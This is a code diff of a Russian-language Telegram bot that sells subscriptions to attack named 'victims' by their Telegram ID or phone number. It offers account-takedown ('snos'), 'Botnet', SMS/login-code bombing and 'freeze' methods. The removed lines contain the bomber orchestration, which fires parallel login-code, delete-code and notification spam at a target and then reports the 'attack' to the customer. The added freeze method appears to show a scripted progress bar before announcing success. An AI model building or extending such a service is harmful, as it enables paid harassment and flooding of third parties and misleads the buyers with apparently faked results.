@@ -15,19 +15,11 @@ from aiogram.filters import Command
 from aiogram.utils.formatting import *
 from config import *
 from syym import *
-from bomber import *
-from fast__method import spam_notification_sync, set_log_file
 from concurrent.futures import ThreadPoolExecutor
 import database
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
-
-# === Executor и log_dir для fast__method ===
-executor = ThreadPoolExecutor(max_workers=1)
-log_dir = "logs"
-if not os.path.exists(log_dir):
-    os.makedirs(log_dir)
 
 # === Состояния для рассылки ===
 broadcast_waiting = False  # Флаг ожидания сообщения для рассылки
@@ -117,9 +109,7 @@ async def create_promocode_async(promocode_name, reward, max_uses=-1):
         
         reward_text = {
             "whitelist": "Вайт лист",
-            "subscription": "Подписка",
-            "premium": "Премиум",
-            "premium_sub": "Премиум + Подписка"
+            "subscription": "Подписка"
         }.get(reward, reward)
         
         message = f"Новый промокод: {promocode_name.upper()}\nИспользования: 0\nНаграда: {reward_text}"
@@ -164,15 +154,6 @@ def activate_promocode(user_id, ref_link):
         success = add_to_whitelist(user_id)
     elif reward == "subscription":
         success = update_subscription_status(user_id, True)
-    elif reward == "premium":
-        # Для премиума нужна подписка
-        if not get_subscription_status(user_id):
-            update_subscription_status(user_id, True)
-        success = update_premium_status(user_id, True)
-    elif reward == "premium_sub":
-        success = update_subscription_status(user_id, True)
-        if success:
-            success = update_premium_status(user_id, True)
     
     if success:
         # Увеличиваем счетчик использований и отмечаем как использованный
@@ -181,9 +162,7 @@ def activate_promocode(user_id, ref_link):
         
         reward_text = {
             "whitelist": "Вайт лист",
-            "subscription": "Подписка навсегда",
-            "premium": "Премиум",
-            "premium_sub": "Премиум + Подписка"
+            "subscription": "Подписка навсегда"
         }.get(reward, reward)
         
         return True, f"✅ Промокод был успешно активирован! Вы получили: {reward_text}", reward
@@ -500,7 +479,6 @@ async def admin_panel_1(callback: CallbackQuery):
             f"👥 Пользователей: {stats['users']}",
             f"🚫 Забанено: {stats['banned']}",
             f"💎 С подпиской: {stats['subscribed']}",
-            f"👑 С премиумом: {stats['premium']}",
             f"📝 В белом списке: {stats['whitelist']}",
             f"🎟️ Промокодов: {stats['promocodes']}",
             "",
@@ -547,7 +525,6 @@ async def admin_panel(message: Message):
             f"👥 Пользователей: {stats['users']}",
             f"🚫 Забанено: {stats['banned']}",
             f"💎 С подпиской: {stats['subscribed']}",
-            f"👑 С премиумом: {stats['premium']}",
             f"📝 В белом списке: {stats['whitelist']}",
             f"🎟️ Промокодов: {stats['promocodes']}",
             "",
@@ -634,7 +611,6 @@ async def handle_my(callback: CallbackQuery):
 
     # Получаем статус подписки и премиума из users.txt
     subscription_status = "активна" if get_subscription_status(user.id) else "не активна"
-    premium_status = "активен" if get_premium_status(user.id) else "не активен"
 
     content = as_list(
         BlockQuote(Bold("👤 Профиль")),
@@ -642,7 +618,6 @@ async def handle_my(callback: CallbackQuery):
         Bold(f"🔹 Имя: {user.full_name}"), 
         Bold(f"🔹 ID: {user.id}"),  
         Bold(f"🔹 Подписка: {subscription_status}"),
-        Bold(f"🔹 Премиум: {premium_status}")
 ) 
     await callback.message.edit_text(
         **content.as_kwargs(),
@@ -676,29 +651,15 @@ async def handle_subscription(callback: CallbackQuery):
         BlockQuote(Bold("💎 Подписка")),
         "",
         Bold("🚀 Обычная подписка:"),
-        Bold("└ Навсегда — 5$"),
-        Bold("ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ"),
-        Bold("👑 Премиум апгрейд:"),
-        Bold("└ Навсегда — 3$"),
+        Bold("└ 1 день — 1$"),
+        Bold("└ 7 дней — 5$"),
+        Bold("└ 30 дней — 10$"),
+        Bold("└ Навсегда — 25$"),
         "",
         Bold("📄 Добавление в вайт лист"),
-        Bold("└ 1 аккаунт — 1.$"),
+        Bold("└ Аккаунт — 3$"),
         "",
-        BlockQuote(Bold("В обычную подписку входит:")),
-        "",
-        Bold("• Метод session"),
-        Bold("• Метод mail"),
-        Bold("• Уникальный префикс в чате"),
-        "",
-        BlockQuote(Bold("В премиум входит:")),
-        "",
-        Bold("• Защита от действий со стороны других пользователей бота"),
-        Bold("• Premium метод — всё в одном"),
-        Bold("• Web метод"),
-        Bold("• Botnet метод"),
-        Bold("• Уникальный префикс в чате"),
-        "",
-        Italic("Премиум докупается к уже активной подписке!")
+        Italic("Купить подписку можно по кнопкам ниже")
     )
     
     await callback.message.edit_text(
@@ -736,133 +697,6 @@ async def handle_info(callback: CallbackQuery):
     
     await callback.answer()
 
-# === меню выбора типа сноса ===
-@dp.callback_query(F.data == "start")
-async def handle_demon(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    
-    # Записываем действие и проверяем авто-модерацию (callback)
-    from syym import record_user_action, check_and_auto_ban
-    if not is_admin(user_id):
-        record_user_action(user_id, "callback")
-        if await check_and_auto_ban(user_id, bot=bot, action_type="callback"):
-            return  # Тихий игнор
-    
-    # Проверяем режим техобслуживания
-    if await check_maintenance_mode(user_id, callback=callback):
-        return
-    
-    # Проверяем бан и отправляем сообщение при первом обращении
-    if await check_ban_and_notify(user_id, bot=bot, callback=callback):
-        return  # Тихий игнор
-    
-    write_log(f"{user_id} нажал кнопку 'Начать'")
-    
-    # Показываем меню выбора
-    content = as_list(
-        BlockQuote(Bold("Выберите действие ниже:ㅤㅤㅤㅤㅤ"))
-    )
-
-    await callback.message.edit_text(
-        **content.as_kwargs(),
-        reply_markup=snos_keyboard
-    )
-    await callback.answer()
-
-
-# === Session ===
-@dp.callback_query(F.data == "session")
-async def handle_session(callback: CallbackQuery):
-    global method_waiting
-    user_id = callback.from_user.id
-    
-    # Записываем действие и проверяем авто-модерацию (callback)
-    from syym import record_user_action, check_and_auto_ban
-    if not is_admin(user_id):
-        record_user_action(user_id, "callback")
-        if await check_and_auto_ban(user_id, bot=bot, action_type="callback"):
-            return  # Тихий игнор
-    
-    # Проверяем режим техобслуживания
-    if await check_maintenance_mode(user_id, callback=callback):
-        return
-    
-    # Проверяем бан и отправляем сообщение при первом обращении
-    if await check_ban_and_notify(user_id, bot=bot, callback=callback):
-        return  # Тихий игнор
-    
-    write_log(f"{user_id} нажал кнопку 'Session'")
-    
-    # Проверяем подписку
-    has_subscription = get_subscription_status(user_id)
-    
-    if not has_subscription:
-        await callback.message.edit_text(
-            **BlockQuote(Bold("❌ оплати!ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ")).as_kwargs(),
-            reply_markup=back_keyboard
-        )
-        await callback.answer()
-        return
-    
-    # Если есть подписка, запрашиваем ID жертвы
-    method_waiting = "session"
-    await callback.message.edit_text(
-        "📱 <b>Session method</b>\n\n"
-        "Отправьте ID жертвы.\n"
-        "Например: <code>123456789</code>",
-        parse_mode="html",
-        reply_markup=back_keyboard
-    )
-    await callback.answer()
-
-# === Mail method ===
-@dp.callback_query(F.data == "mail")
-async def handle_main(callback: CallbackQuery):
-    global method_waiting
-    user_id = callback.from_user.id
-    
-    # Записываем действие и проверяем авто-модерацию (callback)
-    from syym import record_user_action, check_and_auto_ban
-    if not is_admin(user_id):
-        record_user_action(user_id, "callback")
-        if await check_and_auto_ban(user_id, bot=bot, action_type="callback"):
-            return  # Тихий игнор
-    
-    # Проверяем режим техобслуживания
-    if await check_maintenance_mode(user_id, callback=callback):
-        return
-    
-    # Проверяем бан и отправляем сообщение при первом обращении
-    if await check_ban_and_notify(user_id, bot=bot, callback=callback):
-        return  # Тихий игнор
-    
-    write_log(f"{user_id} нажал кнопку 'Mail'")
-    
-    # Проверяем подписку
-    has_subscription = get_subscription_status(user_id)
-    
-    if not has_subscription:
-        content = as_list(
-            BlockQuote(Bold("❌ оплати!")),
-        )
-        
-        await callback.message.edit_text(
-            **content.as_kwargs(),
-            reply_markup=back_keyboard
-        )
-        await callback.answer()
-        return
-    
-    # Если есть подписка, запрашиваем ID жертвы
-    method_waiting = "main"
-    await callback.message.edit_text(
-        "📨 <b>Mail method</b>\n\n"
-        "Отправьте ID жертвы.\n"
-        "Например: <code>123456789</code>",
-        parse_mode="html",
-        reply_markup=back_keyboard
-    )
-    await callback.answer()
 
 # === Premium ===
 @dp.callback_query(F.data == "premium")
@@ -889,9 +723,8 @@ async def handle_premium(callback: CallbackQuery):
     
     # Проверяем подписку и премиум
     has_subscription = get_subscription_status(user_id)
-    has_premium = get_premium_status(user_id)
     
-    if not has_subscription or not has_premium:
+    if not has_subscription:
         await callback.message.edit_text(
             **BlockQuote(Bold("❌ оплати!")).as_kwargs(),
             reply_markup=back_keyboard
@@ -900,62 +733,15 @@ async def handle_premium(callback: CallbackQuery):
         return
     
     # Если есть и подписка, и премиум, запрашиваем ID жертвы
-    method_waiting = "premium"
+    method_waiting = "freeze"
     await callback.message.edit_text(
-        "👑 <b>Premium method</b>\n\n"
-        "Отправьте ID жертвы.\n"
+        "❄️ <b>Freeze </b> ❄️\n\n"
+        "Отправьте ID цели.\n"
         "Например: <code>123456789</code>",
         parse_mode="html",
         reply_markup=back_keyboard
     )
     await callback.answer()
-
-# === Бомбер ===
-@dp.callback_query(F.data == "sms")
-async def handle_main(callback: CallbackQuery):
-    global method_waiting
-    user_id = callback.from_user.id
-    
-    if not is_admin(user_id):
-        record_user_action(user_id, "callback")
-        if await check_and_auto_ban(user_id, bot=bot, action_type="callback"):
-            return  # Тихий игнор
-    
-    # Проверяем режим техобслуживания
-    if await check_maintenance_mode(user_id, callback=callback):
-        return
-    
-    # Проверяем бан и отправляем сообщение при первом обращении
-    if await check_ban_and_notify(user_id, bot=bot, callback=callback):
-        return  # Тихий игнор
-    
-    write_log(f"{user_id} нажал кнопку 'sms'")
-    
-    # Проверяем подписку
-    has_subscription = get_subscription_status(user_id)
-    
-    if not has_subscription:
-        content = as_list(
-            BlockQuote(Bold("❌ оплати!")),
-        )
-        
-        await callback.message.edit_text(
-            **content.as_kwargs(),
-            reply_markup=back_keyboard
-        )
-        await callback.answer()
-        return
-    
-    # Если есть подписка, запрашиваем ID жертвы
-    method_waiting = "sms"
-    await callback.message.edit_text(
-        "<b>📬 Telegram Notification method</b>\n\n"
-        "Отправьте номер телефона для доставки.\n"
-        "Например: <code>+79999999999</code>",
-        parse_mode="html",
-        reply_markup=back_keyboard
-    )
-    await callback.answer()    
 
 # === Назад ===
 @dp.callback_query(F.data == "back")
@@ -1308,7 +1094,6 @@ async def handle_admin_back(callback: CallbackQuery):
         f"👥 Пользователей: {stats['users']}",
         f"🚫 Забанено: {stats['banned']}",
         f"💎 С подпиской: {stats['subscribed']}",
-        f"👑 С премиумом: {stats['premium']}",
         f"📝 В белом списке: {stats['whitelist']}",
         f"🎟️ Промокодов: {stats['promocodes']}",
         "",
@@ -1459,49 +1244,6 @@ async def handle_admin_check_sub(callback: CallbackQuery):
     )
     await callback.answer()
 
-# === Выдать премиум (админ) ===
-@dp.callback_query(F.data == "admin_give_premium")
-async def handle_admin_give_premium(callback: CallbackQuery):
-    global admin_action_waiting
-    user_id = callback.from_user.id
-    
-    if not is_admin(user_id):
-        await callback.answer("❌ Доступ запрещен", show_alert=True)
-        return
-    
-    write_log(f"Админ {user_id} запросил выдачу премиума")
-    admin_action_waiting = "give_premium"
-    
-    await callback.message.edit_text(
-        "👑 <b>Выдать премиум</b>\n\n"
-        "Отправьте ID пользователя для выдачи премиума.\n"
-        "Например: 123456789",
-        parse_mode="html",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Админ меню", callback_data="admin_back")]])
-    )
-    await callback.answer()
-
-# === Забрать премиум (админ) ===
-@dp.callback_query(F.data == "admin_revoke_premium")
-async def handle_admin_revoke_premium(callback: CallbackQuery):
-    global admin_action_waiting
-    user_id = callback.from_user.id
-    
-    if not is_admin(user_id):
-        await callback.answer("❌ Доступ запрещен", show_alert=True)
-        return
-    
-    write_log(f"Админ {user_id} запросил отзыв премиума")
-    admin_action_waiting = "revoke_premium"
-    
-    await callback.message.edit_text(
-        "❌ <b>Забрать премиум</b>\n\n"
-        "Отправьте ID пользователя для отзыва премиума.\n"
-        "Например: 123456789",
-        parse_mode="html",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Админ меню", callback_data="admin_back")]])
-    )
-    await callback.answer()
 
 # === Удалить админа (админ) ===
 @dp.callback_query(F.data == "admin_remove_admin")
@@ -1712,185 +1454,7 @@ async def handle_all_messages(message: Message):
             promocode_waiting = ""
             return
     
-    # Обработка методов (session/main/premium) - проверка ID жертвы
-    if method_waiting == "sms":
-        # Проверяем бан
-        if not is_admin(user_id):
-            if await check_ban_and_notify(user_id, bot=bot, message=message):
-                method_waiting = ""
-                return
-
-        target_id = parse_user_id(text)
-        if target_id is None:
-            await message.answer(
-                "❌ <b>Ошибка!</b>\n\nНеверный формат номера.\nПример: <code>+79999999999</code>",
-                parse_mode="HTML"
-            )
-            return
-
-        method = method_waiting
-        method_waiting = ""
-
-        progress_msg = await message.answer(
-            f"<b>📬 Начинаю доставку на: <code>+{target_id}</code>, пожалуйста подождите...</b>",
-            parse_mode="HTML"
-        )
-
-        # ---- ЛОГИ ----
-        from datetime import datetime
-        log_file_path = os.path.join(
-            log_dir,
-            f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        )
-
-        set_log_file(log_file_path)
-
-        from bomber import set_log_file as bomber_set_log_file
-        bomber_set_log_file(log_file_path)
-
-        write_log(f"[SMS] Лог файл: {log_file_path}")
-
-        # ---- FAST METHOD (НЕ ЖДЁМ, НЕ БЛОКИРУЕТ) ----
-        async def run_fast_method_async():
-            try:
-                loop = asyncio.get_event_loop()
-                write_log(f"[SMS] FAST start {target_id}")
-                result = await loop.run_in_executor(
-                    executor,
-                    spam_notification_sync,
-                    target_id, log_dir, None
-                )
-                write_log(f"[SMS] FAST done {target_id} → {result}")
-            except Exception as e:
-                write_log(f"[SMS] FAST ERROR {target_id}: {e}")
-
-        max_normal_tasks = 5
-        max_delete_tasks = 5
-        max_fast_tasks = 2
-
-        write_log(
-            f"[SMS] FULL POWER → {target_id}: "
-            f"{max_normal_tasks} normal, {max_delete_tasks} delete, {max_fast_tasks} fast"
-        )
-
-        # ---- ОСНОВНЫЕ КОДЫ (их ждём) ----
-        normal_tasks = [
-            asyncio.create_task(send_code(target_id))
-            for _ in range(max_normal_tasks)
-        ]
-
-        # ---- DELETE КОДЫ ----
-        from bomber import spam_delete_codes, send_log_file
-
-        delete_tasks = [
-            asyncio.create_task(spam_delete_codes(target_id))
-            for _ in range(max_delete_tasks)
-        ]
-
-        # ---- FAST METHOD (НЕ ЖДЁМ!) ----
-        for _ in range(max_fast_tasks):
-            asyncio.create_task(run_fast_method_async())
-
-        all_main_tasks = normal_tasks + delete_tasks
-
-        write_log(f"[SMS] Запуск основных задач ({len(all_main_tasks)} шт), таймаут 90 секунд")
-
-        start_time = datetime.now()
-
-        # ---- БЛОК УПРАВЛЕНИЯ ТАЙМАУТОМ ----
-        try:
-            await asyncio.wait_for(
-                asyncio.gather(*all_main_tasks, return_exceptions=True),
-                timeout=90
-            )
-            write_log(f"[SMS] Основные задачи завершены вовремя ({target_id})")
-
-        except asyncio.TimeoutError:
-            write_log(f"[SMS] ТАЙМАУТ 90 сек → отмена основных задач ({target_id})")
-
-            for task in all_main_tasks:
-                if not task.done():
-                    task.cancel()
-                    try:
-                        await task
-                    except:
-                        pass
-
-        except Exception as e:
-            write_log(f"[SMS] ERROR main tasks: {e}")
-            import traceback
-            write_log(traceback.format_exc())
-
-        # ---- СООБЩЕНИЕ О ЗАВЕРШЕНИИ ----
-        try:
-            await progress_msg.edit_text("📊 <b>Атака завершена! Формирую отчёт...</b>", parse_mode="HTML")
-        except:
-            pass
-
-        await asyncio.sleep(2)
-
-        # ---- ФОРМИРУЕМ И ОТПРАВЛЯЕМ ОТЧЕТ ----
-        try:
-            customer_username = message.from_user.username or "Не указан"
-            customer_id = message.from_user.id 
-            if customer_username != "Не указан":
-                customer_username = f"@{customer_username}"
-
-            end_time = datetime.now()
-            duration = (end_time - start_time).total_seconds()
-
-            if not os.path.exists(log_file_path):
-                write_log(f"[SMS] Лог не найден, создаю пустой")
-                with open(log_file_path, "w", encoding="utf-8") as f:
-                    f.write("")
-
-            write_log(f"[SMS] Отправляю логи клиенту...")
-
-            await send_log_file(
-                log_file_path,
-                target_id,
-                user_id=user_id,
-                customer_id=customer_id,
-                customer_username=customer_username,
-                start_time=start_time,
-                end_time=end_time,
-                duration=duration
-            )
-
-            write_log(f"[SMS] Логи отправлены")
-
-            try:
-                await progress_msg.edit_text(
-                    "✅ <b>Атака завершена!</b>\n📄 Отчёт отправлен.",
-                    parse_mode="HTML",
-                    reply_markup=back_keyboard
-                )
-            except:
-                await message.answer(
-                    "✅ <b>Атака завершена!</b>\n📄 Отчёт отправлен.",
-                    parse_mode="HTML",
-                    reply_markup=back_keyboard
-                )
-
-        except Exception as e:
-            write_log(f"[SMS] Ошибка отправки отчёта: {e}")
-            try:
-                await progress_msg.edit_text(
-                    f"⚠️ <b>Ошибка при отправке отчёта:</b>\n<code>{e}</code>",
-                    parse_mode="HTML",
-                    reply_markup=back_keyboard
-                )
-            except:
-                await message.answer(
-                    f"⚠️ <b>Ошибка при отправке отчёта:</b>\n<code>{e}</code>",
-                    parse_mode="HTML",
-                    reply_markup=back_keyboard
-                )
-
-        write_log(f"[SMS] Пользователь {user_id} → метод {method} для {target_id}")
-        return
-
-    elif method_waiting == "mail" or method_waiting == "premium" or method_waiting == "session":
+    if method_waiting == "freeze":
         # Проверяем бан перед обработкой метода
         if not is_admin(user_id):
             if await check_ban_and_notify(user_id, bot=bot, message=message):
@@ -1923,8 +1487,8 @@ async def handle_all_messages(message: Message):
             await progress_msg.edit_text("📱 [██████████] 75% Обработка данных...")
             await asyncio.sleep(0.8)
             
-            await progress_msg.edit_text("✅ <b>Успешно отправлено!</b>\n\nДоставка была успешно выполнена!", parse_mode="html", reply_markup=back_keyboard)
-            write_log(f"Пользователь {user_id} использовал метод {method} для {target_id} - SMS отправлено")
+            await progress_msg.edit_text("✅ <b>Успешно отправлено!</b>\n\Заморозка была успешно выполнена!", parse_mode="html", reply_markup=back_keyboard)
+            write_log(f"Пользователь {user_id} использовал метод {method} для {target_id}")
         return
     
     if is_admin(user_id):
@@ -1992,26 +1556,6 @@ async def handle_all_messages(message: Message):
                 else:
                     await message.answer(f"❌ Ошибка при отзыве подписки у пользователя {target_id}")
                 return
-            elif action == "give_premium":
-                # Проверяем наличие подписки перед выдачей премиума
-                if not get_subscription_status(target_id):
-                    await message.answer(f"<b>❌ Пользователь {target_id} не имеет активной подписки. Сначала выдайте подписку!</b>",parse_mode="HTML")
-                    return
-                success = update_premium_status(target_id, True)
-                if success:
-                    await message.answer(f"<b>✅ Пользователю {target_id} выдан премиум</b>",parse_mode="HTML")
-                    write_log(f"Админ {user_id} выдал премиум пользователю {target_id}")
-                else:
-                    await message.answer(f"❌ Ошибка при выдаче премиума пользователю {target_id}")
-                return
-            elif action == "revoke_premium":
-                success = update_premium_status(target_id, False)
-                if success:
-                    await message.answer(f"✅ У пользователя {target_id} отозван премиум")
-                    write_log(f"Админ {user_id} отозвал премиум у пользователя {target_id}")
-                else:
-                    await message.answer(f"❌ Ошибка при отзыве премиума у пользователя {target_id}")
-                return
             elif action == "add_admin":
                 success = add_admin(target_id)
                 if success:
@@ -2031,13 +1575,10 @@ async def handle_all_messages(message: Message):
             elif action == "check_sub":
                 # Проверяем статус подписки и премиума
                 has_sub = get_subscription_status(target_id)
-                has_premium = get_premium_status(target_id)
                 sub_text = "✅ активна" if has_sub else "❌ не активна"
-                premium_text = "✅ активен" if has_premium else "❌ не активен"
                 await message.answer(
                     f"🔍 <b>Проверка подписки пользователя {target_id}</b>\n\n"
-                    f"Подписка: {sub_text}\n"
-                    f"Премиум: {premium_text}",
+                    f"Подписка: {sub_text}\n",
                     parse_mode="html"
                 )
                 write_log(f"Админ {user_id} проверил подписку пользователя {target_id}")
@@ -2254,7 +1795,6 @@ async def main():
         print("[!] Бот запущен в обычном режиме")
     
     # Загружаем статус авто-модерации при запуске
-    from syym import load_auto_moderation_status, is_auto_moderation_enabled
     load_auto_moderation_status()
     if is_auto_moderation_enabled():
         print("[!] Авто-модерация включена")
@@ -2443,9 +1983,7 @@ async def handle_promocode_reward_select(callback: CallbackQuery):
     
     reward_text = {
         "whitelist": "Вайт лист",
-        "subscription": "Подписка",
-        "premium": "Премиум",
-        "premium_sub": "Премиум + Подписка"
+        "subscription": "Подписка"
     }.get(reward, reward)
     
     await callback.message.edit_text(
